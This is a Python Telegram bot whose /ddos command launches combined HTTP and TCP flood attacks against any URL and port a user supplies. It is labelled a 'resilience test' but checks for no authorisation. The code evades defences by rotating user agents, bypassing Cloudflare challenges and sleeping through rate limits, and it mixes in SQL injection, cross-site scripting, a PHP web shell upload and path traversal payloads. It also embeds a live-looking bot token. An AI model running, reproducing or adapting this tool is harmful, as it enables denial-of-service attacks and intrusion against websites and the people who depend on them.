import asyncio
import aiohttp
import random
import socket
import ssl
import cloudscraper
import threading
import time
import logging
import json
import urllib.parse
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from concurrent.futures import ThreadPoolExecutor
from fake_useragent import UserAgent

# Configuration
BOT_TOKEN = "7729228849:AAHv1rMlNFeoGaI2GJO2_N0-PoOkenZhUg4"
MAX_TEST_DURATION = 7200  # 2 hours maximum
MAX_WORKERS = 250  # Increased worker pool
CF_CHALLENGE_TIMEOUT = 15  # Cloudflare challenge timeout

# Enhanced User Agents
ua = UserAgent()
USER_AGENTS = [ua.chrome, ua.firefox, ua.safari, ua.edge]

# Cloudflare bypass configurations
CF_BROWSER = {
    'browser': 'chrome',
    'mobile': False,
    'platform': 'windows'
}

# Setup logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

class AttackResult:
    def __init__(self):
        self.total_requests = 0
        self.successful = 0
        self.blocked = 0
        self.errors = 0
        self.cf_challenges = 0
        self.ratelimit_hits = 0
        self.bypassed = 0
        self.tcp_sent = 0
        self.start_time = time.time()

    def duration(self):
        return time.time() - self.start_time

    def requests_per_second(self):
        return self.total_requests / self.duration() if self.duration() > 0 else 0

async def advanced_cf_bypass(url):
    """Advanced Cloudflare bypass using multiple techniques"""
    try:
        scraper = cloudscraper.create_scraper(browser=CF_BROWSER)
        
        # First request to get cookies
        resp = scraper.get(url, timeout=CF_CHALLENGE_TIMEOUT)
        
        # If challenged, solve it
        if resp.status_code in [403, 503, 429]:
            resp = scraper.get(url, timeout=CF_CHALLENGE_TIMEOUT)
        
        # Return True if bypassed, False if still blocked
        return resp.status_code == 200
    
    except Exception as e:
        logger.error(f"CF bypass failed: {str(e)}")
        return False

async def send_evasive_request(session, url, result, payload=None):
    """Send request with evasion techniques"""
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Cache-Control": "max-age=0",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
    }

    try:
        if payload:
            headers["Content-Type"] = "application/x-www-form-urlencoded"
            async with session.post(url, data=payload, headers=headers) as resp:
                return await handle_response(resp, result)
        else:
            # Randomize between HEAD and GET
            method = random.choice([session.get, session.head])
            async with method(url, headers=headers) as resp:
                return await handle_response(resp, result)
                
    except Exception as e:
        result.errors += 1
        logger.debug(f"Request failed: {str(e)}")
        return False

async def handle_response(response, result):
    """Process server response"""
    result.total_requests += 1
    
    if response.status == 200:
        result.successful += 1
        return True
    elif response.status in [403, 503]:
        result.blocked += 1
        if "cloudflare" in response.headers.get("server", "").lower():
            result.cf_challenges += 1
            if await advanced_cf_bypass(str(response.url)):
                result.bypassed += 1
                return True
    elif response.status == 429:
        result.ratelimit_hits += 1
        # Implement rate limit evasion
        await asyncio.sleep(random.uniform(0.1, 1.5))
        return False
    
    return False

def generate_malicious_payload():
    """Generate various test payloads"""
    payloads = [
        {"username": "admin", "password": "' OR '1'='1"},
        {"search": "<script>alert(1)</script>"},
        {"file": ("test.txt", "<?php system($_GET['cmd']); ?>", "text/plain")},
        {"q": "../../../../etc/passwd"}
    ]
    return random.choice(payloads)

def enhanced_tcp_flood(target_ip, target_port, duration, result):
    """Advanced TCP flood with socket recycling"""
    end_time = time.time() + duration
    ssl_context = ssl.create_default_context()
    
    while time.time() < end_time:
        try:
            # Create new socket each iteration
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            
            # SSL/TLS wrapped connection
            if target_port == 443:
                wrapped_sock = ssl_context.wrap_socket(sock, server_hostname=target_ip)
                wrapped_sock.connect((target_ip, target_port))
                wrapped_sock.send(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n\r\n")
                wrapped_sock.close()
            else:
                sock.connect((target_ip, target_port))
                sock.send(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n\r\n")
                sock.close()
            
            result.tcp_sent += 1
            time.sleep(0.01)  # Small delay to avoid being too aggressive
            
        except Exception as e:
            logger.debug(f"TCP flood error: {str(e)}")
            time.sleep(0.1)
        finally:
            try:
                sock.close()
            except:
                pass

async def attack_worker(session, base_url, port, duration, result):
    """Individual attack worker"""
    end_time = time.time() + duration
    paths = ["/", "/wp-admin", "/api/v1/users", "/test", "/admin"]
    
    while time.time() < end_time:
        path = random.choice(paths)
        target_url = f"{base_url}:{port}{path}" if port not in [80, 443] else f"{base_url}{path}"
        
        # Alternate between GET and POST
        if random.random() > 0.7:  # 30% chance for POST
            payload = generate_malicious_payload()
            await send_evasive_request(session, target_url, result, payload)
        else:
            await send_evasive_request(session, target_url, result)
        
        # Random delay to avoid being too predictable
        await asyncio.sleep(random.uniform(0.01, 0.1))

async def run_advanced_attack(url, port, duration, workers):
    """Main attack coordinator"""
    result = AttackResult()
    parsed_url = urllib.parse.urlparse(url)
    target_ip = socket.gethostbyname(parsed_url.netloc)
    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
    
    # Start TCP flood in separate thread
    tcp_thread = threading.Thread(
        target=enhanced_tcp_flood,
        args=(target_ip, port, duration, result)
    )
    tcp_thread.start()
    
    # HTTP flood with async
    connector = aiohttp.TCPConnector(limit=0, force_close=True, enable_cleanup_closed=True)
    timeout = aiohttp.ClientTimeout(total=duration)
    
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        tasks = []
        for _ in range(workers):
            task = asyncio.create_task(attack_worker(session, base_url, port, duration, result))
            tasks.append(task)
        
        await asyncio.gather(*tasks)
    
    tcp_thread.join()
    return result

@dp.message(Command("ddos"))
async def start_advanced_test(message: types.Message):
    """Handle the test command"""
    try:
        args = message.text.split()
        if len(args) < 4:
            await message.reply("Usage: /ddos <url> <port> <duration> [workers=50]")
            return

        url = args[1]
        port = int(args[2])
        duration = int(args[3])
        workers = min(MAX_WORKERS, int(args[4])) if len(args) > 4 else 50

        if not url.startswith(("http://", "https://")):
            url = f"http://{url}"

        if duration > MAX_TEST_DURATION:
            await message.reply(f"⚠️ Maximum duration is {MAX_TEST_DURATION} seconds")
            return

        warning_msg = (
            "🚨 Starting ADVANCED resilience test\n\n"
            f"🔗 Target: {url}\n"
            f"🚪 Port: {port}\n"
            f"⏱ Duration: {duration} seconds\n"
            f"👷 Workers: {workers}\n\n"
            "This will test:\n"
            "- HTTP/HTTPS flood with evasion\n"
            "- Advanced TCP flood\n"
            "- Cloudflare bypass attempts\n"
            "- Rate limit testing\n"
            "- WAF probing\n\n"
            "Type STOP to abort test."
        )
        
        await message.reply(warning_msg)
        
        # Run the attack
        start_time = time.time()
        result = await run_advanced_attack(url, port, duration, workers)
        test_duration = time.time() - start_time

        # Generate comprehensive report
        report = f"""
📊 ADVANCED TEST RESULTS 📊

🔗 Target: {url}:{port}
⏱ Duration: {test_duration:.2f} seconds
👷 Workers: {workers}

📈 Requests:
  • Total: {result.total_requests:,}
  • Successful: {result.successful:,}
  • Blocked: {result.blocked:,}
  • Errors: {result.errors:,}
  • RPS: {result.requests_per_second():.2f}

🛡 Protection Events:
  • Cloudflare Challenges: {result.cf_challenges:,}
  • Rate Limits Hit: {result.ratelimit_hits:,}
  • Bypassed Protections: {result.bypassed:,}

⚡ TCP Flood:
  • Packets Sent: {result.tcp_sent:,}

💡 SECURITY ASSESSMENT:
  • {'🟢 WEAK PROTECTION' if result.successful > result.blocked * 2 else '🟡 MODERATE PROTECTION' if result.successful > result.blocked else '🔴 STRONG PROTECTION'}
  • {'🟢 Rate limits effective' if result.ratelimit_hits > 0 else '🔴 No rate limiting detected'}
  • {'🟢 Cloudflare active' if result.cf_challenges > 0 else '🔴 No Cloudflare protection'}
"""
        await message.reply(report)

    except Exception as e:
        await message.reply(f"❌ Critical error: {str(e)}")

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())